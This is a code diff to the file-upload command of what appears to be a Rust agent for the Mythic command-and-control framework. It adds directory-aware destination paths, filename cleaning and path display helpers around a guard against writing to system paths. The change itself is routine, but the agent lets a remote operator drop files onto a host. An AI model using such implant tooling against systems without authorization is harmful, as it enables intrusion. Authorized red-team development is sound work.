@@ -21,14 +21,14 @@
 //! ```
 
 use std::io::{Read, Write};
-use std::path::Path;
+use std::path::{Path, PathBuf};
 
 use base64::engine::general_purpose::STANDARD;
 use base64::read::DecoderReader;
 use mythic::{TaskMessage, TaskResponse};
 use serde::Deserialize;
 
-use crate::common::pathguard::is_protected_path;
+use crate::common::pathguard::{display_path, is_protected_path, normalize_user_path};
 
 // ── Params ──────────────────────────────────────────────────
 
@@ -36,6 +36,9 @@ use crate::common::pathguard::is_protected_path;
 struct Params {
     /// Absolute path where the file should be written.
     path: String,
+    /// Original filename from Mythic. Used when `path` points to a directory.
+    #[serde(default)]
+    original_filename: Option<String>,
     /// Base64-encoded file contents.
     file_bytes: String,
     /// When true, allows writes to system / boot directories that are
@@ -58,6 +61,40 @@ const MAX_UPLOAD_BYTES: u64 = 256 * 1024 * 1024;
 /// overhead against memory footprint.
 const DECODE_CHUNK: usize = 16 * 1024;
 
+fn clean_filename(name: &str) -> Option<String> {
+    let normalized = normalize_user_path(name);
+    Path::new(&normalized)
+        .file_name()
+        .map(|n| n.to_string_lossy().to_string())
+        .filter(|n| !n.is_empty())
+}
+
+fn path_looks_like_dir(input: &str) -> bool {
+    input.ends_with('/') || input.ends_with('\\')
+}
+
+fn upload_destination(path: &str, original_filename: Option<&str>) -> Result<PathBuf, String> {
+    let normalized = normalize_user_path(path);
+    let filename = original_filename.and_then(clean_filename);
+    if normalized.is_empty() {
+        return filename
+            .map(PathBuf::from)
+            .ok_or_else(|| "upload path is empty and original filename is unavailable".into());
+    }
+
+    let dest = PathBuf::from(&normalized);
+    if dest.is_dir() || path_looks_like_dir(&normalized) {
+        let Some(filename) = filename else {
+            return Err(format!(
+                "upload destination {} is a directory but original filename is unavailable",
+                display_path(&dest)
+            ));
+        };
+        return Ok(dest.join(filename));
+    }
+    Ok(dest)
+}
+
 // ── Main handler ────────────────────────────────────────────
 
 pub fn handle(task: &TaskMessage) -> TaskResponse {
@@ -67,13 +104,17 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
     };
 
     // 1. Path guard — refuse to overwrite system paths unless explicit opt-in.
-    let path = Path::new(&params.path);
-    if !params.allow_system_path && is_protected_path(&params.path) {
+    let dest = match upload_destination(&params.path, params.original_filename.as_deref()) {
+        Ok(path) => path,
+        Err(e) => return TaskResponse::failed(task.id, &e),
+    };
+    let path = dest.as_path();
+    if !params.allow_system_path && is_protected_path(&display_path(path)) {
         return TaskResponse::failed(
             task.id,
             &format!(
                 "refusing write to system path {}; set allow_system_path=true to override",
-                path.display()
+                display_path(path)
             ),
         );
     }
@@ -84,7 +125,7 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
             if let Err(e) = std::fs::create_dir_all(parent) {
                 return TaskResponse::failed(
                     task.id,
-                    &format!("create parent dir {} failed: {e}", parent.display()),
+                    &format!("create parent dir {} failed: {e}", display_path(parent)),
                 );
             }
         }
@@ -104,7 +145,10 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
     let file = match std::fs::File::create(path) {
         Ok(f) => f,
         Err(e) => {
-            return TaskResponse::failed(task.id, &format!("create {} failed: {e}", path.display()))
+            return TaskResponse::failed(
+                task.id,
+                &format!("create {} failed: {e}", display_path(path)),
+            );
         }
     };
     let mut writer = std::io::BufWriter::new(file);
@@ -135,22 +179,15 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
     if let Err(e) = decode_result {
         // Best-effort cleanup of the partial file.
         let _ = std::fs::remove_file(path);
-        return TaskResponse::failed(
-            task.id,
-            &format!("upload {} failed: {e}", path.display()),
-        );
+        return TaskResponse::failed(task.id, &format!("upload {} failed: {e}", display_path(path)));
     }
 
-    info!("[upload] wrote {} bytes to {}", written, path.display());
+    info!("[upload] wrote {} bytes to {}", written, display_path(path));
     TaskResponse {
         task_id: task.id,
         completed: Some(true),
         status: Some("completed".into()),
-        user_output: Some(format!(
-            "uploaded {} bytes to {}",
-            written,
-            path.display()
-        )),
+        user_output: Some(format!("uploaded {} bytes to {}", written, display_path(path))),
         ..Default::default()
     }
 }
